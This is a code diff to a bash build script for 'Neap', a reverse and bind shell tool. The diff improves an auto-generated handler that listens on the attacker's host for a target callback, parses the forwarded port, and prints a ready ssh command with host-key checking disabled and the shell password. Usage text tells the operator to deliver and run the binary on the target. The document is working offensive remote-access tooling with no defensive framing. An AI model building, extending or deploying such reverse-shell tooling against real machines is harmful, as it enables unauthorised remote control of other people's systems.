@@ -371,6 +371,13 @@ build() {
 # Handler for Neap reverse shell — auto-generated
 # Target will connect back to $HOST:$PORT
 # Password: $PASSWORD
+#
+# Notes:
+# - The target connects to port $PORT (the reverse callback).
+# - Neap then opens a dynamic SSH tcpip-forward on a random local port;
+#   that's the port you SSH to, NOT $PORT.
+# - This script watches the listener's log for the forward line and
+#   prints a ready-to-paste ssh command when the target arrives.
 
 set -euo pipefail
 
@@ -380,7 +387,7 @@ listener="\$script_dir/../bin/$listener_bin"
 
 if [ ! -x "\$listener" ]; then
     echo "[-] Listener binary not found: \$listener" >&2
-    echo "    Build a CLI-enabled neap and drop it there, or run manually:" >&2
+    echo "    Rebuild with build.sh, or run manually:" >&2
     echo "      neap -l -p $PORT -v" >&2
     exit 1
 fi
@@ -389,17 +396,31 @@ cat <<BANNER
 [*] Waiting for Neap reverse shell on port $PORT ...
 [*] Password: $PASSWORD
 
-[*] When the target connects, in another terminal run:
-    ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1
-    (password: $PASSWORD)
+[*] The listener will log a 'tcpip-forward: listening on <ip>:<port>'
+    line as soon as the target authenticates — that is the port you
+    SSH to (NOT the callback port $PORT).
+
+[*] This handler auto-prints the ready-to-paste ssh command.
 
 [*] Ctrl+C to stop the listener.
 ────────────────────────────────────────────────────────────────
 BANNER
 
-# Run the listener in the foreground (verbose) so incoming connections are
-# visible. Exec so the process replaces the shell — Ctrl+C stops it cleanly.
-exec "\$listener" -l -p $PORT -v
+# Run the listener in the foreground (verbose) and pipe stderr into the
+# same stream we're watching. As soon as Neap opens the remote forward
+# we spot the line and print a ready-made ssh command so the user
+# doesn't have to hunt for the dynamic port.
+"\$listener" -l -p $PORT -v 2>&1 | while IFS= read -r line; do
+    printf '%s\n' "\$line"
+    if [[ "\$line" =~ tcpip-forward:\ listening\ on\ ([0-9.a-fA-F:]+):([0-9]+) ]]; then
+        fwd_host="\${BASH_REMATCH[1]}"
+        fwd_port="\${BASH_REMATCH[2]}"
+        printf '\n[+] Target is ready. SSH to it with:\n'
+        printf '    ssh -o StrictHostKeyChecking=no -p %s %s@%s\n' \\
+            "\$fwd_port" "$LUSER" "\$fwd_host"
+        printf '    (password: %s)\n\n' "$PASSWORD"
+    fi
+done
 HANDLER
         chmod +x "$handler_file"
         success "Handler: $handler_file"
@@ -466,14 +487,18 @@ NEXEC
     if [ "$MODE" = "reverse" ]; then
         echo -e "  ${TEXT}1. Start the listener on this (attacker) host:${RESET}"
         echo -e "       ${GREEN}$OUTPUT_DIR/$listener_bin -l -p $PORT -v${RESET}"
-        echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${handler_stem}.sh)${RESET}"
+        echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${handler_stem}.sh${RESET}"
+        echo -e "       ${SUBTEXT} — prints the exact ssh command when the target arrives)${RESET}"
         echo ""
         echo -e "  ${TEXT}2. Deliver and run the $(${target_is_windows} && echo 'Windows ' || echo '')binary on the target:${RESET}"
         echo -e "       ${GREEN}./$safe_name${RESET}"
         echo ""
-        echo -e "  ${TEXT}3. Once the target calls back, in another terminal:${RESET}"
-        echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1${RESET}"
+        echo -e "  ${TEXT}3. Once the target authenticates, the listener logs:${RESET}"
+        echo -e "       ${SUBTEXT}[INFO neap::forwarding] tcpip-forward: listening on 127.0.0.1:<port>${RESET}"
+        echo -e "     ${TEXT}SSH into the target via that forwarded port (NOT $PORT):${RESET}"
+        echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p <port> $LUSER@127.0.0.1${RESET}"
         echo -e "       ${TEXT}Password: ${YELLOW}$PASSWORD${RESET}"
+        echo -e "       ${SUBTEXT}(the handler script above does this automatically)${RESET}"
     else
         echo -e "  ${TEXT}1. Deploy and start the $(${target_is_windows} && echo 'Windows ' || echo '')bind-shell binary on the target:${RESET}"
         echo -e "       ${GREEN}./$safe_name${RESET}"
